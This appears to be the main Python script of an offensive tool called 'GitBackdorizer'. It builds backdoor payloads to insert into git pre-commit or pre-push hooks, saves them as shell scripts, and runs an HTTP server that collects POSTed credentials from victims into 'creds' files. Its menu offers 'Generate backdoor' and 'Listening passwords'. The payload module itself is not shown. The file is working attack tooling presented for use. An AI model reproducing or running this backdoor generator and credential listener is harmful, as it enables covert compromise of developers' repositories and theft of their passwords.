import os
import datetime
from conf import menu
from conf.banner import banner
from conf import payload as pl
from prompt_toolkit import prompt
from prompt_toolkit.contrib.completers import WordCompleter
from http.server import HTTPServer, BaseHTTPRequestHandler

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        filename_creds = 'creds-%s' % datetime.datetime.now().strftime("%Y%m%d%H%M")
        file_creds = open('creds/%s' % filename_creds,'a')
        file_creds.write(str(body, 'utf-8'))
        file_creds.write('\n')
        print(str(body, 'utf-8'))

class GitBackdorizer(object):

    def __init__(self):
        self.main_menu = menu.main
        self.gen_menu = menu.gen_backdoor
        self.banner = banner()

    def listening(self, ip_listening, port_listening):
        os.system('clear')
        print('\n\n[+] Creds:')
        httpd = HTTPServer(("0.0.0.0", int(port_listening)), SimpleHTTPRequestHandler)
        httpd.serve_forever()

    def write_payload(self, payload_content):
        filename = prompt('Set output name: ')
        if filename == '':
            filename = "output-{}.sh".format(datetime.datetime.now().strftime("%Y%m%d%H%M"))
        filename = 'output/{}'.format(filename)
        output_payload = open(filename, "w")
        output_payload.write(payload_content)
        output_payload.close()
        return(filename)

    def set_config(self):
        ip_listening = prompt('Set IP to listening: ')
        port_listening = prompt('Set PORT to listening: ')
        payload_choice = prompt('Choose into insert payload:\n1 - pre-commit\n2 - pre-push\n:> ')
        payload_hook = lambda choice: "pre-commit" if choice == "1" else "pre-push"
        payload = payload_hook(payload_choice)
        payload_content = pl.generate(ip_listening, port_listening, payload)
        filename = self.write_payload(payload_content)
        save_config = prompt('Save configuration? [y] [n]\n:> ')
        if 'y' == save_config.lower():
            output_config = open('conf/conf_payload.conf', 'w')
            output_config.write('{}|{}|{}'.format(ip_listening, port_listening, payload))
            output_config.close()
        elif 'n' == save_config.lower():
            pass
        print('\n[+] File in output/{}'.format(filename))
        listen_response = prompt('Listening backdoor? [y] [n]\n:> ')
        if 'y' == listen_response.lower():
            self.listening(ip_listening, port_listening)
            #pass
        else:
            self.start()
       
    def get_config(self):
        load_file = open('conf/conf_payload.conf', 'r')
        ip_listening,port_listening,payload = load_file.readline().split('|')
        load_file.close()
        payload_content = pl.generate(ip_listening, port_listening, payload)
        filename = self.write_payload(payload_content)
        print('\n[+] File in output/{}'.format(filename))
        listen_response = prompt('Listening backdoor? [y] [n]\n:> ')
        if 'y' == listen_response.lower():
            self.listening(ip_listening, port_listening)
        else:
            self.start()

    def gen_backdoor(self):
        os.system('clear')
        print(self.gen_menu)
        while 1:
            user_input = prompt(':> ')
            
            if '1' == user_input:
                self.set_config()
                
            elif '2' == user_input:
                self.get_config()
                
            elif 'back' == user_input:
                self.start()
            else:
                os.system('clear')
                print('Chose one option')
                print(self.gen_menu)

    def menu(self):
        noob_choice = 0
        while 1:
            user_input = prompt(':> ')
            
            if '1' == user_input:
                self.gen_backdoor()

            elif '2' == user_input:
                os.system('clear')
                choice_load = prompt('Load config? [y] [n]\n')
                if 'y' == choice_load.lower():
                    load_file = open('conf/conf_payload.conf', 'r')
                    ip_listening,port_listening,payload = load_file.readline().split('|')
                    load_file.close()
                    self.listening(ip_listening, port_listening)
                elif 'n' == choice_load.lower():
                    ip_listening = prompt('Set IP to listening: ')
                    port_listening = prompt('Set PORT to listening: ')
                    self.listening(ip_listening, port_listening)

            elif 'exit' == user_input:
                exit()

            else:
                noob_choice += 1
                if noob_choice == 3:
                    print("You're dumb? \nI'll show you again what you have to do:\n")
                print("Choose one option\n1 - Generate backdoor\n2 - Listening passwords\nexit - to quit")


    def start(self):
        try:
            os.system('clear')
            print(self.banner)
            print(self.main_menu)
            self.menu()
        
        except KeyboardInterrupt:
            exit() 


if __name__ == '__main__':
    gb = GitBackdorizer()
    gb.start()
